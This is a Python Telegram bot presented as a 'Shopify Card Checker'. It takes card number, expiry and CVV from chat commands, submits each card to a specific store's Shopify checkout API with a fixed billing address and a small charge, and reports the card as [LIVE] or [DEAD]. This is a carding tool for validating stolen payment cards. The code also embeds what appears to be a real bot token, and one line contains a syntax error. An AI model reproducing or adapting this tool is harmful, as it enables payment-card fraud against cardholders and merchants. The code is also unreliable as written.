import asyncio
import logging
import json
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from uuid import uuid4

# Set up logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Shopify API endpoint and headers
SHOPIFY_CHECKOUT_URL = "https://www.seembo.com/checkouts/cn/Z2NwLXVzLWNlbnRyYWwxOjAxSlYwN0JCUTc4NTdEUktOMEJZVjFESkZR"
HEADERS = {
    "Content-Type": "application/json",
    "Accept": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

# Telegram bot token (replace with your actual bot token)
TELEGRAM_BOT_TOKEN = "7748515975:AAHyGpFl4HXLLud45VS4v4vMkLfOiA6YNSs"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a welcome message when the /start command is issued."""
    await update.message.reply_text(
        "Welcome to the Shopify Card Checker Bot! Use /sh <card_number>|MM|YYYY|CVV to check a card.\n"
        "Example: /sh 4447962561402250|05|2025|539"
    )

async def poll_receipt(receipt_id: str, session_token: str) -> dict:
    """Poll for receipt status using the PollForReceipt query."""
    poll_query = """
    query PollForReceipt($receiptId: ID!, $sessionToken: String!) {
        receipt(receiptId: $receiptId, sessionInput: {sessionToken: $sessionToken}) {
            ...ReceiptDetails
            __typename
        }
    }
    fragment ReceiptDetails on Receipt {
        ... on ProcessedReceipt {
            id
            paymentDetails {
                paymentCardBrand
                creditCardLastFourDigits
                paymentAmount { amount currencyCode __typename }
                __typename
            }
            __typename
        }
        ... on FailedReceipt {
            id
            processingError {
                ... on PaymentFailed { code messageUntranslated __typename }
                __typename
            }
            __typename
        }
        ... on ProcessingReceipt { id pollDelay __typename }
        ... on WaitingReceipt { id pollDelay __typename }
    }
    """
    payload = {
        "query": poll_query,
        "variables": {"receiptId": receipt_id, "sessionToken": session_token}
    }
    for _ in range(5):  # Limit to 5 polling attempts
        response = requests.post(SHOPIFY_CHECKOUT_URL, headers=HEADERS, json=payload)
        if response.status_code == 200:
            result = response.json().get("data", {}).get("receipt", {})
            if result.get("__typename") in ["ProcessedReceipt", "FailedReceipt"]:
                return result
            elif result.get("__typename") in ["ProcessingReceipt", "WaitingReceipt"]:
                poll_delay = result.get("pollDelay", 1)
                logger.info(f"Polling: Waiting {poll_delay} seconds for receipt {receipt_id}")
                await asyncio.sleep(poll_delay)
            else:
                break
        else:
            logger.error(f"Polling failed for receipt {receipt_id}: HTTP {response.status_code}")
            break
    return {}

async def check_card(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the /sh command to check card details."""
    try:
        # Extract card details from the command
        if not context.args:
            await update.message.reply_text("Please provide card details in the format: /sh <card_number>|MM|YYYY|CVV")
            return

        card_input = context.args[0]
        card_parts = card_input.split("|")
        if len(card_parts) != 4:
            await update.message.reply_text("Invalid format. Use: /sh <card_number>|MM|YYYY|CVV")
            return

        card_number, exp_month-va, exp_year, cvv = card_parts

        # Validate card input
        if not (card_number.isdigit() and len(card_number) == 16 and
                exp_month.isdigit() and len(exp_month) == 2 and
                exp_year.isdigit() and len(exp_year) == 4 and
                cvv.isdigit() and len(cvv) == 3):
            await update.message.reply_text("Invalid card details. Ensure correct format and valid numbers.")
            return

        # Prepare GraphQL mutation for Shopify checkout
        graphql_query = """
        mutation SubmitForCompletion($input: NegotiationInput!, $attemptToken: String!) {
            submitForCompletion(input: $input, attemptToken: $attemptToken) {
                ... on SubmitSuccess {
                    receipt {
                        ...ReceiptDetails
                        __typename
                    }
                    __typename
                }
                ... on SubmitFailed {
                    reason
                    __typename
                }
                ... on FailedReceipt {
                    id
                    processingError {
                        ... on PaymentFailed { code messageUntranslated __typename }
                        __typename
                    }
                    __typename
                }
                ... on ProcessingReceipt {
                    id
                    pollDelay
                    __typename
                }
                ... on WaitingReceipt {
                    id
                    pollDelay
                    __typename
                }
            }
        }
        fragment ReceiptDetails on Receipt {
            ... on ProcessedReceipt {
                id
                paymentDetails {
                    paymentCardBrand
                    creditCardLastFourDigits
                    paymentAmount { amount currencyCode __typename }
                    __typename
                }
                __typename
            }
        }
        """

        # Construct the input payload
        attempt_token = str(uuid4())
        session_token = str(uuid4())  # Generate a session token for polling
        negotiation_input = {
            "payment": {
                "paymentMethod": {
                    "creditCard": {
                        "number": card_number,
                        "expirationMonth": int(exp_month),
                        "expirationYear": int(exp_year),
                        "cvv": cvv
                    },
                    "billingAddress": {
                        "address1": "420 Park ave",
                        "city": "New York",
                        "countryCode": "US",
                        "zoneCode": "NY",
                        "postalCode": "10016",
                        "phone": "(879) 658-2525"
                    }
                },
                "amount": {
                    "amount": 23.98,
                    "currencyCode": "USD"
                },
                "sessionToken": session_token
            }
        }

        payload = {
            "query": graphql_query,
            "variables": {
                "input": negotiation_input,
                "attemptToken": attempt_token
            }
        }

        # Send request to Shopify checkout API
        response = requests.post(SHOPIFY_CHECKOUT_URL, headers=HEADERS, json=payload)
        response_data = response.json()

        # Check response for success or failure
        if response.status_code == 200 and "data" in response_data:
            submit_result = response_data["data"].get("submitForCompletion", {})
            typename = submit_result.get("__typename")

            if typename == "SubmitSuccess":
                await update.message.reply_text(
                    f"[LIVE] {card_input} | Payment Successful!"
                )
            elif typename == "FailedReceipt":
                error_code = submit_result.get("processingError", {}).get("code", "UNKNOWN")
                await update.message.reply_text(
                    f"[DEAD] {card_input} | {error_code}"
                )
            elif typename in ["ProcessingReceipt", "WaitingReceipt"]:
                receipt_id = submit_result.get("id")
                poll_delay = submit_result.get("pollDelay", 1)
                logger.info(f"Initial response: {typename}, polling after {poll_delay} seconds")
                await asyncio.sleep(poll_delay)
                poll_result = await poll_receipt(receipt_id, session_token)
                if poll_result.get("__typename") == "ProcessedReceipt":
                    await update.message.reply_text(
                        f"[LIVE] {card_input} | Payment Successful!"
                    )
                elif poll_result.get("__typename") == "FailedReceipt":
                    error_code = poll_result.get("processingError", {}).get("code", "UNKNOWN")
                    await update.message.reply_text(
                        f"[DEAD] {card_input} | {error_code}"
                    )
                else:
                    await update.message.reply_text(
                        f"[ERROR] {card_input} | Polling failed or timed out"
                    )
            else:
                reason = submit_result.get("reason", "Unknown error")
                await update.message.reply_text(
                    f"[ERROR] {card_input} | Unable to process: {reason}"
                )
        else:
            await update.message.reply_text(
                f"[ERROR] {card_input} | Failed to connect to Shopify API"
            )

    except Exception as e:
        logger.error(f"Error processing card: {str(e)}")
        await update.message.reply_text(
            f"[ERROR] {card_input} | An unexpected error occurred: {str(e)}"
        )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Log errors caused by updates."""
    logger.error(f"Update {update} caused error {context.error}")
    if update.message:
        await update.message.reply_text("An error occurred. Please try again later.")

def main() -> None:
    """Run the bot."""
    # Create the Application
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("sh", check_card))

    # Add error handler
    application.add_error_handler(error_handler)

    # Start the bot
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()